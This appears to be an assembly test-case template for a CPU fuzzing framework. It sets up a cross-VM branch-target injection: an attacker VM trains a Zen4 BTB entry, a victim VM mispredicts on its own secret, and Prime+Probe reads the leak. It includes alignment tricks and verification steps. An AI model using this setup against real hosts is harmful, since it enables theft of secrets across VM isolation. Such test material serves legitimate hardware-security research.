.intel_syntax noprefix

# ============================================================================
# INJECTION: attacker (vm) trains the BTB, VICTIM (vmvictim) is steered.
#
# This is the residue template with the roles SWAPPED and a cross-actor readout:
#   - vm       = ATTACKER : primes the L1D, trains a BTB entry, later probes.
#   - vmvictim = VICTIM   : loads its OWN secret, its indirect jmp inherits the
#                           attacker's BTB entry and MISPREDICTS, transiently
#                           touching a secret-dependent line => evicts an L1D set.
# The attacker reads that eviction via P+P (Prime+Probe) — NO shared memory.
#
# Orchestration (host main):
#   round0  vm.vm_0        -> measurement_start   (PRIME: attacker fills L1D sets)
#   round1  vm.vm_train    -> attacker's indirect jmp trains BTB[jmp PC]
#   round2  vmvictim.1     -> victim loads secret, jmp MISPREDICTS -> transient leak
#   round3  vm.vm_measure  -> measurement_end     (PROBE: attacker reads evicted set)
#
# Alignment mirrors the WORKING residue template exactly: the trainer (attacker)
# has NO data loads, the mispredictor (victim) has the 6 loads — same asymmetry that
# lands both indirect jmps in the same Zen4 BTB bucket via the matched .16.4 preambles.
# The victim leaks at the mispredict target (whatever sits at that offset in ITS space),
# driven by its secret registers — same self-leak mechanism as residue, but now a
# DIFFERENT actor reads it.
#
# RUN WITH config-v2v-pp.yaml (executor_mode: P+P — cross-actor cache contention).
#
# VERIFY any violation is genuine injection (not a generic transient):
#   1) trainer-strip: replace the ATTACKER's `jmp rax` (vm_train) with nops -> must go CLEAN.
#   2) counterexample-swap: vary ONLY vmvictim's input -> htrace changes; vary ONLY vm's -> no change
#      (=> it is the VICTIM's secret leaking, i.e. real cross-domain injection).
# ============================================================================

# ----------------------------- Host orchestrator ----------------------------
.section .data.main
.function_main_0:
    .macro.set_h2g_target.vm.function_vm_0:
    .macro.set_g2h_target.main.function_main_1:
    .macro.switch_h2g.vm.0:

.function_main_1:
    .macro.landing_g2h.main_1:
    .macro.set_h2g_target.vm.function_vm_train:
    .macro.set_g2h_target.main.function_main_2:
    .macro.switch_h2g.vm.1:

.function_main_2:
    .macro.landing_g2h.main_2:
    .macro.set_h2g_target.vmvictim.function_vmvictim_1:
    .macro.set_g2h_target.main.function_main_3:
    xor rax, rax  # noremove
    xor rbx, rbx  # noremove
    xor rcx, rcx  # noremove
    xor rdx, rdx  # noremove
    xor rsi, rsi  # noremove
    xor rdi, rdi  # noremove
    .macro.switch_h2g.vmvictim.2:

.function_main_3:
    .macro.landing_g2h.main_3:
.macro.fault_handler:
.patch_placeholder_fault_handler:
    .macro.set_h2g_target.vm.function_vm_measure:
    .macro.set_g2h_target.main.function_main_4:
    .macro.switch_h2g.vm.3:

.function_main_4:
    .macro.landing_g2h.main_4:
    nop


# ----------------------------- Attacker (vm): prime, train, probe -----------
.section .data.vm
.function_vm_0:
    .macro.landing_h2g.vm_0:
    .macro.measurement_start.vm_0:
    .macro.switch_g2h.main.vm_0:
    lfence

.function_vm_train:
    .macro.landing_h2g.vm_1:
    # preamble adds code distance so this jmp lands in the same BTB bucket as the victim's
    .macro.random_instructions.16.4.vm_pre:
    lea rax, qword ptr [rip + .function_vm_3]  # noremove   attacker's benign target
    jmp rax  # noremove                        # trains BTB[this PC] = vm_3's offset

.function_vm_3:
    .macro.random_instructions.16.8.vm_post:
    lfence  # noremove
    .macro.switch_g2h.main.vm_1:
    lfence

.function_vm_measure:
    .macro.landing_h2g.vm_2:
    .macro.measurement_end.vm_2:
    .macro.switch_g2h.main.2:
    lfence


# ----------------------------- Victim (vmvictim): mispredict + leak ---------
.section .data.vmvictim
.function_vmvictim_1:
    .macro.landing_h2g.vmvictim_1:
    xor rax, rax  # noremove
    mov rax, qword ptr [r14 + 0x2000] # noremove   victim's OWN secret in rax..rdi
    mov rbx, qword ptr [r14 + 0x2008] # noremove
    mov rcx, qword ptr [r14 + 0x2010] # noremove
    mov rdx, qword ptr [r14 + 0x2018] # noremove
    mov rsi, qword ptr [r14 + 0x2020] # noremove
    mov rdi, qword ptr [r14 + 0x2028] # noremove
    mfence # noremove
    # SAME-length preamble as the attacker -> same BTB bucket
    .macro.random_instructions.16.4.vmv_pre:
    lea rbx, qword ptr [rip + .function_vmvictim_3]  # noremove   victim's own arch target
    jmp rbx  # noremove              # arch -> vmvictim_3;  BTB mispredict -> vm_3's offset (transient leak)

.function_vmvictim_3:
    .macro.random_instructions.32.16.vmv_gadget:
    lfence  # noremove
    .macro.switch_g2h.main.vmvictim_2:
    lfence


# ----------------------------- Exit -----------------------------------------
.section .data.main
.test_case_exit:
